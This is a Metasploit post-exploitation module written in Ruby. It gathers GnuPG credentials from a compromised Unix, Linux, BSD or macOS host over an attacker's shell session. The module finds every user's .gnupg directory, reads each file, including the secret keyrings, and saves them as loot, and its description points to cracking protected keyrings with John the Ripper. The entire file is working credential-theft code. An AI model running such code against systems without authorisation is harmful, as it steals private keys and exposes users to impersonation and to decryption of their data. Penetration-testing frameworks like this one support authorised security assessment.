##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/unix'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Unix

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Gather GnuPG Credentials Collection',
			'Description'    => %q{
					This module will collect the contents of all users' .gnupg directories on the targeted
				machine. Password protected secret keyrings can be cracked with John the Ripper (JtR).
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Dhiru Kholia <dhiru[at]openwall.com>'],
			'Platform'       => ['linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['shell']
		))
	end

	# This module is largely based on ssh_creds and firefox_creds.rb.

	def run
		print_status("Finding .gnupg directories")
		paths = enum_user_directories.map {|d| d + "/.gnupg"}
		# Array#select! is only in 1.9
		paths = paths.select { |d| directory?(d) }

		if paths.nil? or paths.empty?
			print_error("No users found with a .gnupg directory")
			return
		end

		download_loot(paths)
	end

	def download_loot(paths)
		print_status("Looting #{paths.count} directories")
		paths.each do |path|
			path.chomp!
			sep = "/"
			files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)

			files.each do |file|
				target = "#{path}#{sep}#{file}"
				if directory?(target)
					next
				end
				print_status("Downloading #{path}#{sep}#{file} -> #{file}")
				data = read_file(target)
				file = file.split(sep).last
				type = file.gsub(/\.gpg.*/, "").gsub(/gpg\./, "")
				loot_path = store_loot("gpg.#{type}", "text/plain", session, data,
					"gpg_#{file}", "GnuPG #{file} File")
				print_good("File stored in: #{loot_path.to_s}")
			end

		end
	end

end
